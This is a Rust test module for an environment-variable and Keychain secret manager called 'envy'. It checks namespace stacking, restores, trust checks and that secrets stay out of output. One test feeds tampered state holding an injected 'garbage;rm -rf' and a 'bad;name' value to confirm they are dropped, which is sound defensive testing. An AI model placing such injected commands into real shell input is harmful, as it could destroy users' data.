        let out = activate_in(&s, &s.user, &store, "work", &prev).unwrap();
        assert_eq!(
            out.stdout,
            format!("unset X\n{}export W='w'\n", next.state_exports())
        );
        assert_eq!(
            out.notes,
            [format!(
                "note: left unset: X (project namespace \"base\" in {here} has changed since you confirmed it; run envy base there to review it)"
            )]
        );
        assert!(!out.stdout.contains("zq-") && !out.notes.concat().contains("zq-"));
        // Never confirmed for this checkout at all: the same.
        std::fs::remove_dir_all(s.user.dir().join("trust")).unwrap();
        let out = activate_in(&s, &s.user, &store, "work", &prev).unwrap();
        assert!(out.stdout.starts_with("unset X\n"), "{}", out.stdout);
        assert_eq!(
            out.notes,
            [format!(
                "note: left unset: X (project namespace \"base\" in {here} is not confirmed; run envy base there to review it)"
            )]
        );
    }

    #[test]
    fn restore_from_another_folder_leaves_the_var_unset_and_names_the_folder() {
        let s = stack_levels(&[("work", "[vars]\nW = \"w\"\n")], &[]);
        let store = MemoryStore::default();
        let prev = stack_of(&[
            ("dev", "/Users/me/elsewhere/.envy", &["X", "Y"]),
            ("work", "user", &["X", "Y", "W"]),
        ]);
        let out = activate_in(&s, &s.user, &store, "work", &prev).unwrap();
        let next = stack_of(&[
            ("dev", "/Users/me/elsewhere/.envy", &["X", "Y"]),
            ("work", "user", &["W"]),
        ]);
        assert_eq!(
            out.stdout,
            format!("unset X Y\n{}export W='w'\n", next.state_exports())
        );
        assert_eq!(
            out.notes,
            [
                "note: left unset: X, Y (namespace \"dev\" was loaded from /Users/me/elsewhere/.envy, which is not visible from this folder; run envy dev in that project to load it again)"
            ]
        );
        // An entry from an older envy records no level: the same.
        let mut old = prev.clone();
        old.entries[0].source = None;
        let out = activate_in(&s, &s.user, &store, "work", &old).unwrap();
        assert!(out.stdout.starts_with("unset X Y\n"), "{}", out.stdout);
        assert_eq!(
            out.notes,
            [
                "note: left unset: X, Y (namespace \"dev\" was loaded by an older envy, so its level is unknown; run envy dev to load it again)"
            ]
        );
    }

    fn deactivate_in(
        s: &StackLevels,
        store: &dyn SecretStore,
        ns: &str,
        prev: &ActiveState,
    ) -> Result<Activation> {
        deactivate(store, &s.levels, ns, prev)
    }

    #[test]
    fn off_one_removes_only_that_namespace() {
        let s = stack_levels(&[], &[]);
        let store = MemoryStore::default();
        let prev = stack_of(&[
            ("base", "user", &["A"]),
            ("mid", "user", &["M", "N"]),
            ("top", "user", &["T"]),
        ]);
        let out = deactivate_in(&s, &store, "mid", &prev).unwrap();
        let next = stack_of(&[("base", "user", &["A"]), ("top", "user", &["T"])]);
        assert_eq!(out.stdout, format!("unset M N\n{}", next.state_exports()));
        assert!(out.notes.is_empty(), "{:?}", out.notes);
        // The last one left: the state is cleared, as plain --off does.
        let out =
            deactivate_in(&s, &store, "only", &stack_of(&[("only", "user", &["O"])])).unwrap();
        assert_eq!(
            out.stdout,
            format!("unset O\n{}", ActiveState::default().state_exports())
        );
    }

    #[test]
    fn off_one_restores_the_shadowed_value() {
        let s = stack_levels(
            &[
                ("base", "[vars]\nX = \"base-x\"\nK = \"@keychain\"\n"),
                ("work", "[vars]\nX = \"work-x\"\nW = \"w\"\n"),
            ],
            &[],
        );
        let store = store_of(&[("base", "K", "base-k")]);
        let prev = stack_of(&[("base", "user", &["X", "K"]), ("work", "user", &["X", "W"])]);
        let out = deactivate_in(&s, &store, "work", &prev).unwrap();
        let next = stack_of(&[("base", "user", &["X", "K"])]);
        assert_eq!(
            out.stdout,
            format!("unset W\n{}export X='base-x'\n", next.state_exports())
        );
        assert!(out.notes.is_empty(), "{:?}", out.notes);
        // Removing the loser changes no value.
        let out = deactivate_in(&s, &store, "base", &prev).unwrap();
        let next = stack_of(&[("work", "user", &["X", "W"])]);
        assert_eq!(out.stdout, format!("unset K\n{}", next.state_exports()));
    }

    #[test]
    fn off_one_never_reads_an_untrusted_project_file_and_names_the_folder_when_not_visible() {
        let s = stack_levels(
            &[("work", "[vars]\nX = \"w\"\n")],
            &[("base", "[vars]\nX = \"zq-pulled\"\nY = \"y\"\n")],
        );
        let store = MemoryStore::default();
        let here = label(&s.proj);
        // base was never confirmed here: not read, left unset, said so.
        let prev = stack_of(&[("base", here.as_str(), &["X"]), ("work", "user", &["X"])]);
        let out = deactivate_in(&s, &store, "work", &prev).unwrap();
        assert!(out.stdout.starts_with("unset X\n"), "{}", out.stdout);
        assert!(!out.stdout.contains("zq-"), "{}", out.stdout);
        assert_eq!(
            out.notes,
            [format!(
                "note: left unset: X (project namespace \"base\" in {here} is not confirmed; run envy base there to review it)"
            )]
        );
        // An entry from a folder that is not visible: say where to run --off.
        let prev = stack_of(&[
            ("dev", "/Users/me/elsewhere/.envy", &["X"]),
            ("work", "user", &["X"]),
        ]);
        let out = deactivate_in(&s, &store, "work", &prev).unwrap();
        assert_eq!(
            out.notes,
            [
                "note: left unset: X (namespace \"dev\" was loaded from /Users/me/elsewhere/.envy, which is not visible from this folder; run envy --off dev from that project's folder to remove it)"
            ]
        );
    }

    #[test]
    fn off_of_an_inactive_name_fails_and_changes_nothing() {
        let s = stack_levels(&[("base", "[vars]\nA = \"1\"\n")], &[]);
        let store = store_of(&[("base", "K", "zq-k")]);
        let before = store.snapshot();
        let prev = stack_of(&[("base", "user", &["A"])]);
        let err = deactivate_in(&s, &store, "nope", &prev).unwrap_err();
        assert_eq!(err.to_string(), "nope is not active");
        assert_eq!(store.snapshot(), before);
    }

    #[test]
    fn a_failed_secret_read_on_removal_prints_nothing() {
        let s = stack_levels(&[("base", "[vars]\nK = \"@keychain\"\n")], &[]);
        let store = FailingGet {
            inner: store_of(&[("base", "K", "zq-base-k")]),
            fail_on: "K",
        };
        let prev = stack_of(&[("base", "user", &["K"]), ("work", "user", &["K"])]);
        let err = deactivate_in(&s, &store, "work", &prev).unwrap_err();
        let msg = format!("{err:#} {err:?}");
        assert!(msg.contains('K') && !msg.contains("zq-"), "{msg}");
    }

    #[test]
    fn off_all_still_clears_everything_from_a_damaged_stack() {
        // Per-entry data is gone; only the flat union of names is left.
        let damaged = ActiveState::from_env(|k| match k {
            "ENVY_STACK" => Some("\u{1f}\u{1f}garbage;rm -rf".to_string()),
            "ENVY_VARS" => Some("A B bad;name C".to_string()),
            _ => None,
        });
        let out = crate::activate::render_off(&damaged);
        assert_eq!(
            out,
            format!(
                "unset {}\n{}",
                damaged.all_vars().join(" "),
                ActiveState::default().state_exports()
            )
        );
        assert!(out.starts_with("unset A B C\n"), "{out}");
    }

    #[test]
    fn restore_with_duplicate_names_in_state_reads_the_matching_owner() {
        let s = stack_levels(
            &[("dup", "[vars]\nX = \"user-x\"\n")],
            &[("dup", "[vars]\nX = \"proj-x\"\n")],
        );
        trust_now(&s.proj, "dup");
        let here = label(&s.proj);
        let store = MemoryStore::default();
        // The same name from two levels (tampered state); the last one wins X.
        for (first, second, want) in [
            ("user", here.as_str(), "proj-x"),
            (here.as_str(), "user", "user-x"),
        ] {
            let state = stack_of(&[("dup", first, &["X"]), ("dup", second, &["X"])]);
            let export = Export {
                var: "X".into(),
                from: "dup".into(),
            };
            let (values, notes) = restore_values(
                &s.levels,
                &store,
                &state,
                &[export],
                None,
                Restoring::Removal,
            )
            .unwrap();
            assert_eq!(values.get("X").map(String::as_str), Some(want));
            assert!(notes.is_empty(), "{notes:?}");
        }
    }

    /// A store whose `get` fails for one variable name.
    struct FailingGet {
        inner: MemoryStore,
        fail_on: &'static str,
    }

    impl SecretStore for FailingGet {
        fn get(&self, ns: &str, name: &str) -> Result<Option<Secret>> {
            if name == self.fail_on {
                bail!("simulated Keychain read failure");
            }
            self.inner.get(ns, name)
        }
        fn contains(&self, ns: &str, name: &str) -> Result<bool> {
            self.inner.contains(ns, name)
        }
        fn set(&self, ns: &str, name: &str, value: &Secret) -> Result<()> {
            self.inner.set(ns, name, value)
        }
        fn delete(&self, ns: &str, name: &str) -> Result<()> {
            self.inner.delete(ns, name)
        }
    }

    #[test]
    fn a_failed_secret_read_prints_nothing_and_changes_no_state() {
        let s = stack_levels(
            &[
                ("base", "[vars]\nK = \"@keychain\"\n"),
                ("work", "[vars]\nW = \"@keychain\"\nV = \"@keychain\"\n"),
            ],
            &[],
        );
        let items = [
            ("base", "K", "zq-base-k"),
            ("work", "W", "zq-work-w"),
            ("work", "V", "zq-work-v"),
        ];
        let prev = stack_of(&[("base", "user", &["K"]), ("work", "user", &["K", "W", "V"])]);
        // The added namespace's own secret, then a restored one.
        for fail_on in ["V", "K"] {
            let store = FailingGet {
                inner: store_of(&items),
                fail_on,
            };
            let before = store.inner.snapshot();
            let err = activate_in(&s, &s.user, &store, "work", &prev).unwrap_err();
            let msg = format!("{err:#} {err:?}");
            assert!(msg.contains(fail_on), "{msg}");
            assert!(!msg.contains("zq-"), "{msg}");
            assert_eq!(store.inner.snapshot(), before);
        }
    }

    #[test]
    fn stdout_contains_a_secret_only_in_its_export_line() {
        let s = stack_levels(
            &[
                ("base", "[vars]\nK = \"@keychain\"\nL = \"@keychain\"\n"),
                ("work", "[vars]\nK = \"@keychain\"\nJ = \"@keychain\"\n"),
            ],
            &[],
        );
        let store = store_of(&[
            ("base", "K", "zq-base-k"),
            ("base", "L", "zq-base-l"),
            ("work", "K", "zq-work-k"),
            ("work", "J", "zq-work-j"),
        ]);
        // Added on top (a collision), then refreshed without K (a restore).
        let prev = stack_of(&[("base", "user", &["K", "L"])]);
        let added = activate_in(&s, &s.user, &store, "work", &prev).unwrap();
        std::fs::write(
            s.user.dir().join("work.toml"),
            "[vars]\nJ = \"@keychain\"\n",
        )
        .unwrap();
        let prev = stack_of(&[("base", "user", &["K", "L"]), ("work", "user", &["K", "J"])]);
        let refreshed = activate_in(&s, &s.user, &store, "work", &prev).unwrap();
        for (act, secrets) in [
            (&added, &[("K", "zq-work-k"), ("J", "zq-work-j")][..]),
            (&refreshed, &[("K", "zq-base-k"), ("J", "zq-work-j")]),
        ] {
            for (var, value) in secrets {
                let lines: Vec<&str> = act.stdout.lines().filter(|l| l.contains(value)).collect();
                assert_eq!(lines, [format!("export {var}='{value}'")], "{}", act.stdout);
            }
            assert_eq!(
                act.stdout.matches("zq-").count(),
                secrets.len(),
                "{}",
                act.stdout
            );
            assert!(!act.notes.concat().contains("zq-"), "{:?}", act.notes);
            assert!(!format!("{act:?}").contains("zq-"), "{act:?}");
        }
    }
}
